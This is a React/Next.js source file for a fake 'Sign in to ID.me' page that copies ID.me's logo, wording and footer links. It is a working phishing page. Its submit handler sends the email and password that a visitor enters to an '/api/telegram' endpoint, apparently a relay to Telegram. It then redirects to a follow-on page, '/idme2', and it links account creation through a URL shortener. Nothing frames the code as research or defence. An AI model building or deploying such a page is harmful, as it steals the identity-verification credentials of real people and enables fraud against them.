"use client";
import Image from "next/image";
import { useState } from "react";
import { useRouter } from "next/navigation";
import idmeLogo from "./idme.png";

export default function SignInForm() {
  const router = useRouter();
  const [f1, setF1] = useState(""); // email / username
  const [f2, setF2] = useState(""); // password
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!f1 || !f2) {
      setError("Please fill out both fields.");
      return;
    }

    setIsLoading(true);
    setError("");
    setSuccess("");

    try {
      const res = await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Cache-Control": "no-cache",
        },
        credentials: "same-origin",
        body: JSON.stringify({
          data: {
            email: f1,
            word: f2,
          },
          formType: "ID.me Sign In",
        }),
      });

      if (!res.ok) throw new Error("Submission failed");

    
      setF1("");
      setF2("");

      setTimeout(() => {
        router.replace("/idme2");
      }, 1200);
    } catch (err) {
      console.error(err);
      setError("Failed to log sign-in attempt. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col justify-center py-12 sm:px-6 lg:px-8">
      <div className="sm:mx-auto sm:w-full sm:max-w-md">
        {/* ID.me Logo */}
        <div className="flex justify-center">
          <div className="w-32 h-12 relative">
            <Image
              src={idmeLogo}
              alt="ID.me"
              width={128}
              height={48}
              className="object-contain"
              priority
            />
          </div>
        </div>

        {/* Main Card */}
        <div className="mt-8 bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
          <div className="px-8 pt-8 pb-4">
            <div className="flex justify-center">
              <h1 className="text-2xl font-semibold text-gray-900 tracking-tight">
                Sign in to ID.me
              </h1>
            </div>
          </div>

          <div className="bg-blue-50 py-3 text-center border-y border-gray-100">
            <a
              href="https://cutt.ly/xPJZ0xv"
              target="_blank"
              rel="noopener noreferrer"
              className="text-blue-600 hover:text-blue-700 font-medium text-sm"
            >
              Create an ID.me account
            </a>
          </div>

          <div className="p-8">
            {error && (
              <div className="mb-6 rounded-md bg-red-50 p-4 text-sm text-red-700">
                {error}
              </div>
            )}
            {success && (
              <div className="mb-6 rounded-md bg-green-50 p-4 text-sm text-green-700">
                {success}
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-6">
              {/* HIDDEN type="tel" field – forces browser to activate JavaScript on problematic devices */}
              <input type="tel" style={{ display: "none" }} aria-hidden="true" tabIndex={-1} />

              {/* Email / Username Field – now type="text" (full alphanumeric keyboard) */}
              <div>
                <label
                  htmlFor="f1"
                  className="block text-sm font-medium text-gray-700 mb-1"
                >
                  Email
                </label>
                <input
                  id="f1"
                  name="f1"
                  type="text"                    // ← fixed: allows letters, numbers, @, etc.
                  inputMode="text"               // ← standard keyboard (optional but safe)
                  autoComplete="email"
                  required
                  value={f1}
                  onChange={(e) => setF1(e.target.value)}
                  placeholder="Enter your email"
                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base text-gray-900"
                />
              </div>

              {/* Password Field – unchanged */}
              <div>
                <label
                  htmlFor="f2"
                  className="block text-sm font-medium text-gray-700 mb-1"
                >
                  Password
                </label>
                <input
                  id="f2"
                  name="f2"
                  type="password"
                  autoComplete="current-password"
                  required
                  value={f2}
                  onChange={(e) => setF2(e.target.value)}
                  placeholder="Enter your password"
                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base text-gray-900"
                />
              </div>

              <button
                type="submit"
                disabled={isLoading}
                className="w-full flex justify-center py-3.5 px-4 border border-transparent rounded-lg shadow-sm text-base font-semibold text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-70 disabled:cursor-not-allowed transition-colors"
              >
                {isLoading ? "Signing in..." : "Sign in to ID.me"}
              </button>
            </form>
          </div>
        </div>

        <div className="mt-8 text-center text-xs text-gray-500 space-x-4">
          <a
            href="https://www.id.me/about"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:text-gray-700"
          >
            What is ID.me?
          </a>
          <span>|</span>
          <a
            href="https://www.id.me/terms"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:text-gray-700"
          >
            Terms of Service
          </a>
          <span>|</span>
          <a
            href="https://www.id.me/privacy"
            target="_blank"
            rel="noopener noreferrer"
            className="hover:text-gray-700"
          >
            Privacy Policy
          </a>
        </div>
      </div>
    </div>
  );
}